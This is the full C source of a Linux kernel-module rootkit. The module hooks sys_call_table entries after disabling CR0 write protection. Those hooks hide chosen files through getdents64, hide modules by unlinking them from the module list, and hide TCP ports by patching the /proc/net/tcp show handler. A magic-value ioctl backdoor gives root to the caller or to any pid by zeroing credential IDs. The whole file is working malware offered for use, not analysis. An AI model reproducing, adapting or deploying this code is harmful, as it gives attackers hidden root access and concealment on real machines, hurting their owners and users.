#include <linux/kernel.h>
#include <linux/module.h>
#include <asm/paravirt.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/compiler_types.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/fdtable.h>
#include <linux/path.h>
#include <linux/dcache.h>
#include <linux/list.h>
#include <linux/export.h>
#include <linux/seq_file.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <linux/proc_fs.h>


#define MAX_CLOAK_FILE_COUNT 16
#define MAX_CLOAK_FILE_NAME_LEN 16
#define MAX_CLOAK_MOD_COUNT 16
#define MAX_CLOAK_MOD_NAME_LEN 16
#define MAX_CLOAK_PORT_COUNT 16
#define ROOTKIT_IOCTL_MAGIC 0x20000125
#define ROOTKIT_CMD_MAGIC_HEAD 0x20000126
#define ROOTKIT_CMD_MAGIC_TAIL 0x20000127
#define ROOTKIT_CMD_ID_HIDEFILE 0x20000128
#define ROOTKIT_CMD_ID_GETROOT 0x20000129
#define ROOTKIT_CMD_ID_TEST 0x2000012a
#define ROOTKIT_CMD_ID_HIDEMOD 0x2000012d
#define ROOTKIT_CMD_ID_SHOWMOD 0x2000012e
#define ROOTKIT_CMD_ID_HIDEPORT 0x2000012f
#define ROOTKIT_CMD_ID_SHOWPORT 0x20000130
#define ROOTKIT_CMD_ID_SHOWFILE 0x20000131
#define ROOTKIT_CMD_ID_SETROOT 0x20000132

#define unprotect_mem() \
    ({\
        orig_cr0=read_cr0();\
        write_cr0(orig_cr0 & (~0x10000));\
     });

#define protect_mem() \
    ({\
        write_cr0(orig_cr0);\
     });

// pass a pointer to this struct to ioctl to communicate with the rootkit, set the real_arg to a sub command struct
struct rootkit_cmd{
    unsigned long magic_head;
    unsigned long cmd_id;
    void* real_arg;
    unsigned long magic_tail;
};

// cloak file related struct
struct cloak_file_cmd{
    char name[MAX_CLOAK_FILE_NAME_LEN];
};

struct cloak_ent{
    unsigned int name_len;
    char name_buf[MAX_CLOAK_FILE_NAME_LEN];
};

// cloak module related struct
struct cloak_mod_cmd{
    char name[MAX_CLOAK_MOD_NAME_LEN];
};

struct cloak_mod_ent{
    struct list_head* prev_mod; // this mod->list.prev
    struct list_head* lh_p; // pointer to this mod->list
    char name_buf[MAX_CLOAK_MOD_NAME_LEN];
};


static int (* real_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
static int (* real_ioctl)(unsigned int fd, unsigned int cmd, unsigned long arg);
static int (* real_tcp4_seq_show)(struct seq_file *seq, void* v);
static void** syscall_table_load = (void**)0;
static unsigned long orig_cr0;
static int rootkit_load_success = 0;
static struct cloak_ent cloak_ent_array[MAX_CLOAK_FILE_COUNT];
static struct cloak_mod_ent cloak_mod_ent_array[MAX_CLOAK_MOD_COUNT];
static unsigned long cloak_ports_array[MAX_CLOAK_PORT_COUNT];

static unsigned long get_syscall_table(void){
    unsigned long addr;
    addr = kallsyms_lookup_name("sys_call_table");
    if(!addr) return 0;
    syscall_table_load = (void**)addr;
    return addr;
}


// +---------------------+
// |  file/process hide  |
// +---------------------+
// add a file name in cloak_ent_array to cloak it
static int add_cloak_file_name(char* name){
    int name_len;
    int i_ent;

    name_len = strlen(name);
    for(i_ent=0;i_ent<MAX_CLOAK_FILE_COUNT;i_ent++){
        if(!cloak_ent_array[i_ent].name_len) break;
    }
    if(i_ent == MAX_CLOAK_FILE_COUNT-1 && cloak_ent_array[i_ent].name_len) return -1; // too many files to fide

    memset((char*)&cloak_ent_array[i_ent].name_buf, 0, name_len);
    memcpy((char*)&cloak_ent_array[i_ent].name_buf, name, name_len);
    cloak_ent_array[i_ent].name_len = name_len;
    printk("[*] cloak file: %s\n", cloak_ent_array[i_ent].name_buf);
    return i_ent;
}

// remove a cloak file
static int remove_cloak_file_name(char* name){
    int name_len;
    int i_ent;
    name_len = strlen(name);
    for(i_ent=0;i_ent<MAX_CLOAK_FILE_COUNT;i_ent++){
        if(cloak_ent_array[i_ent].name_len == name_len && !strcmp(cloak_ent_array[i_ent].name_buf, name)){
            printk("[*] uncloak file: %s\n", cloak_ent_array[i_ent].name_buf);
            cloak_ent_array[i_ent].name_len = 0;
            memset(cloak_ent_array[i_ent].name_buf, 0, MAX_CLOAK_FILE_NAME_LEN);
            return 1;
        }
    }
    return -1;
}

// check if the name is in cloak_ent_array, if so, return the index. If not, return -1
static int is_file_cloaked(char* name){
    unsigned int name_len = strlen(name);
    int i_ent;
    for(i_ent=0;i_ent<MAX_CLOAK_FILE_COUNT;i_ent++){
        if(cloak_ent_array[i_ent].name_len == name_len){
            if(!strcmp((char*)&cloak_ent_array[i_ent].name_buf, name)){
                return i_ent;
            }
        }
    }
    return -1;
}


// fixme: (1)implementation: the rootkit hide all files with the same name in the whole fs, so avoid hiding file with too general name
//        (2)when hiding a file in a dir where there are too many file entris inside it, things may go wrong
//        (3)there are some wiered outputs when rmmod the module, seems that the is_file_cloaked() is somehow mistriggered
static int hack_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
    int retval, len_left;
    char hidename[MAX_CLOAK_FILE_NAME_LEN];
    struct linux_dirent64 *dirent_buf, *dirent_c;
    unsigned short d_len;

    retval = (*real_getdents64)(fd, dirent, count);
    if(retval > 0){ // getdents64() have returned something, copy it from userspace, traverse it to find and hide the file name we want to hide, then copy it back to userspace
        dirent_buf = (struct linux_dirent64*)kmalloc(retval, GFP_KERNEL);
        dirent_c = dirent_buf;
        copy_from_user(dirent_buf, dirent, retval);
        len_left = retval;
        while(len_left > 0){
            d_len = dirent_c->d_reclen;
            len_left -= d_len;
            if(is_file_cloaked((char*)&(dirent_c->d_name)) != -1){
                memset(hidename, 0, MAX_CLOAK_FILE_NAME_LEN);
                memcpy(&hidename, (char*)&(dirent_c->d_name), strlen((char*)&(dirent_c->d_name)));
                // the dirent is the file we want to hide, remove it from dirent_buf
                if(len_left != 0){
                    // in case the dirent is not the last one, copy memory forward to overwrite the struct
                    memmove(dirent_c, (char*)((unsigned long)dirent_c+d_len), len_left);
                }else{
                    // in case the dirent is the last one, overwrite the struct to 0
                    memset(dirent_c, 0, d_len);
                }
                retval -= d_len;
                // printk("[*] successful hide file %s\n", (char*)&hidename);
                continue;
            }

            if(dirent_c->d_reclen == 0){
                // in case some fs driver not implementing the getdents() properly, unlikely?
                printk("[*] shitty fs implementation\n");
                retval -= len_left;
                len_left = 0;
            }
            if(len_left!=0) dirent_c = (struct linux_dirent64*)((unsigned long)dirent_c+d_len);
        }
        // we traversed all dirents struct returned by getdents64(), now copy the modifid buf to user
        copy_to_user(dirent, dirent_buf, retval);
        kfree(dirent_buf);
    }
    return retval;
}

// +---------+
// | getroot |
// +---------+
// prompt a root shell
static int prompt_root_shell(void){
    int* ids;
    int i;
    // the macro current is defined in arch/x86/include/asm/current.h, which will return us the pointer to current task struct
    // the cred field is defined as static, so must be changed by dereferrecing its pointer
    ids = (int*)current->cred;
    for(i=1;i<9;i++) ids[i] = 0;
    return 1;
}

// give a pid and set it root
static int set_pid_root(unsigned long pid){
    struct task_struct* ts_p;
    int* ids;
    int i;
    list_for_each_entry(ts_p, &init_task.tasks, tasks){
        if(ts_p->pid == (pid_t)pid){
            printk("[*] found task_struct for pid:%d, name:%s, give root!\n", ts_p->pid, ts_p->comm);
            ids = (int*)ts_p->cred;
            for(i=1;i<9;i++) ids[i] = 0;
            return 1;
        }
    }
    return -1;  // the target pid not found
}

// +--------------+
// | hide modules |
// +--------------+
// break the module chain list to hide it
static int hide_module_name(char* name){
    int i;
    struct list_head* lh_p;
    struct module* mod_p;

    for(i=0;i<MAX_CLOAK_MOD_COUNT;i++){ // check if already cloaked
        if(cloak_mod_ent_array[i].lh_p && !strcmp(cloak_mod_ent_array[i].name_buf, name)) return 1;
    }
    for(i=0;i<MAX_CLOAK_MOD_COUNT;i++){ // find a empty entry for the new hide request
        if(cloak_mod_ent_array[i].lh_p == NULL) break;
    }
    if(cloak_mod_ent_array[i].prev_mod && i==MAX_CLOAK_MOD_COUNT-1) return -1;  // too many module to hide

    // find the module
    for(lh_p=&THIS_MODULE->list;lh_p!=NULL;){    // travese backward first
        mod_p = list_entry(lh_p, struct module, list);
        if(!strcmp(mod_p->name, name)){ // found!
            goto out;
        }
        lh_p = mod_p->list.next;
    }
    for(lh_p=&THIS_MODULE->list;lh_p!=NULL;){
        mod_p = list_entry(lh_p, struct module, list);
        if(!strcmp(mod_p->name, name)){
            goto out;
        }
        lh_p = mod_p->list.prev;
    }
    return -2; // not found

out:
    cloak_mod_ent_array[i].prev_mod = mod_p->list.prev;
    cloak_mod_ent_array[i].lh_p = &mod_p->list;
    strcpy(cloak_mod_ent_array[i].name_buf, mod_p->name);
    list_del(&mod_p->list);
    return 1;
}

// add the cloak module to the module chain list
static int show_module_name(char* name){
    int i;
    for(i=0;i<MAX_CLOAK_MOD_COUNT;i++){
        if(cloak_mod_ent_array[i].prev_mod && !strcmp(cloak_mod_ent_array[i].name_buf, name)){
            break;
        }
    }
    if(i==MAX_CLOAK_MOD_COUNT-1 && strcmp(cloak_mod_ent_array[i].name_buf, name)) return -1;  // mod name not cloaked

    list_add(cloak_mod_ent_array[i].lh_p, cloak_mod_ent_array[i].prev_mod);
    cloak_mod_ent_array[i].prev_mod = NULL;
    cloak_mod_ent_array[i].lh_p = NULL;
    memset(cloak_mod_ent_array[i].name_buf, 0, MAX_CLOAK_MOD_NAME_LEN);
    return 1;
}

// +------------+
// | hide ports |
// +------------+
static int is_port_cloaked(unsigned short port){
    int i;
    for(i=0;i<MAX_CLOAK_PORT_COUNT;i++){
        if(cloak_ports_array[i] == port) return 1;
    }
    return 0;
}

static int add_cloak_port(unsigned long port){
    int i;
    for(i=0;i<MAX_CLOAK_PORT_COUNT;i++){
        if(cloak_ports_array[i]==0){
            printk("[*] add cloak port: %lu\n", port);
            cloak_ports_array[i] = port;
            return 1;
        }
    }
    return -1;  // too many ports to hide
}

static int show_cloak_port(unsigned long port){
    int i;
    for(i=0;i<MAX_CLOAK_PORT_COUNT;i++){
        if(cloak_ports_array[i] == port){
            printk("[*] remove cloak port: %lu\n", port);
            cloak_ports_array[i] = 0;
            return 1;
        }
    }
    return -1;  // port not cloaked
}

static int hack_tcp4_seq_show(struct seq_file *seq, void* v){
    struct sock* sk = v;
    if(v!=SEQ_START_TOKEN && is_port_cloaked(sk->sk_num)){
        // printk("[DEBUG] hide tcp port: %hd\n", sk->sk_num);
        return 0;
    }
    return real_tcp4_seq_show(seq, v);
}

// hijack the seq_op->show pointer
static int hook_tcp4_seq_show(void){
    struct file* fp;
    struct tcp_seq_afinfo* afinfo;
    fp = filp_open("/proc/net/tcp", O_RDONLY, 0);
    afinfo = (struct tcp_seq_afinfo*)PDE_DATA(fp->f_path.dentry->d_inode);
    real_tcp4_seq_show = afinfo->seq_ops.show;
    afinfo->seq_ops.show = hack_tcp4_seq_show;
    filp_close(fp, 0);
    return 1;
}

static int unhook_tcp4_seq_show(void){
    struct file* fp;
    struct tcp_seq_afinfo* afinfo;
    fp = filp_open("/proc/net/tcp", O_RDONLY, 0);
    afinfo = (struct tcp_seq_afinfo*)PDE_DATA(fp->f_path.dentry->d_inode);
    afinfo->seq_ops.show = real_tcp4_seq_show;
    filp_close(fp, 0);
    return 1;
}


// +--------------+
// | ioctl hijack |
// +--------------+
static int hack_ioctl(unsigned int fd, unsigned int cmd, unsigned long arg){
    if(cmd == ROOTKIT_IOCTL_MAGIC){
        struct rootkit_cmd cmd;
        copy_from_user(&cmd, (void*)arg, sizeof(struct rootkit_cmd));   // the arg points to user space, copy it to kernel space
        if(cmd.magic_head == ROOTKIT_CMD_MAGIC_HEAD && cmd.magic_tail == ROOTKIT_CMD_MAGIC_TAIL){
            switch(cmd.cmd_id){
                case ROOTKIT_CMD_ID_HIDEFILE:{
                    struct cloak_file_cmd cfc;
                    copy_from_user(&cfc, (void*)cmd.real_arg, sizeof(struct cloak_file_cmd));
                    return add_cloak_file_name(cfc.name);
                }
                case ROOTKIT_CMD_ID_SHOWFILE:{
                    struct cloak_file_cmd cfc;
                    copy_from_user(&cfc, (void*)cmd.real_arg, sizeof(struct cloak_file_cmd));
                    return remove_cloak_file_name(cfc.name);
                }
                case ROOTKIT_CMD_ID_GETROOT:{
                    return prompt_root_shell();
                }
                case ROOTKIT_CMD_ID_SETROOT:{
                    return set_pid_root((unsigned long)cmd.real_arg);
                }
                case ROOTKIT_CMD_ID_TEST:{
                    printk("[+] work correctly\n");
                    return ROOTKIT_CMD_ID_TEST;
                }
                case ROOTKIT_CMD_ID_HIDEMOD:{
                    struct cloak_mod_cmd cmc;
                    copy_from_user(&cmc, (void*)cmd.real_arg, sizeof(struct cloak_mod_cmd));
                    // add_cloak_file_name(cmc.name);   // uncomment to totally hide module
                    return hide_module_name(cmc.name);
                }
                case ROOTKIT_CMD_ID_SHOWMOD:{
                    struct cloak_mod_cmd cmc;
                    copy_from_user(&cmc, (void*)cmd.real_arg, sizeof(struct cloak_mod_cmd));
                    // remove_cloak_file_name(cmc.name);    // uncomment this lien
                    return show_module_name(cmc.name);
                }
                case ROOTKIT_CMD_ID_HIDEPORT:{
                    return add_cloak_port((unsigned long)cmd.real_arg);
                }
                case ROOTKIT_CMD_ID_SHOWPORT:{
                    return show_cloak_port((unsigned long)cmd.real_arg);
                }
            }
        }
    }
    return (*real_ioctl)(fd, cmd, arg);
}


// +-------------+
// | module init |
// +-------------+
static void init_buffers(void){
    memset(cloak_ent_array, 0, MAX_CLOAK_FILE_COUNT * sizeof(struct cloak_ent));
    memset(cloak_mod_ent_array, 0, MAX_CLOAK_MOD_COUNT * sizeof(struct cloak_mod_ent));
    memset(cloak_ports_array, 0, MAX_CLOAK_PORT_COUNT * sizeof(unsigned short));
}


int init_module(){
    if(get_syscall_table()){
        printk("[*] sys_call_table load @ 0x%lx\n", (unsigned long)syscall_table_load);
    }else{
        printk("[-] cannot get sys_call_table load address\n");
        goto out;
    }

    printk("[*] rootkit start\n");
    init_buffers();
    real_getdents64 = syscall_table_load[__NR_getdents64];
    real_ioctl = syscall_table_load[__NR_ioctl];
    unprotect_mem();
    syscall_table_load[__NR_getdents64] = hack_getdents64;
    syscall_table_load[__NR_ioctl] = hack_ioctl;
    protect_mem();
    printk("[+] getdents() hooked\n");
    printk("[+] ioctl() hooked\n");
    hook_tcp4_seq_show();
    rootkit_load_success = 1;

out:
	return 0;
}

void cleanup_module(){
	printk("[*] cleanup rootkit\n");
    if(rootkit_load_success){
        unprotect_mem();
        // fixme: we should check if the syscall is hooked by some one else before we overwrite it to its original value, unlikely though
        syscall_table_load[__NR_getdents64] = real_getdents64;
        syscall_table_load[__NR_ioctl] = real_ioctl;
        protect_mem();
        unhook_tcp4_seq_show();
        printk("[+] unhooked\n");
    }
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("KEYMAKER");
MODULE_DESCRIPTION("MY_ROOTKIT");
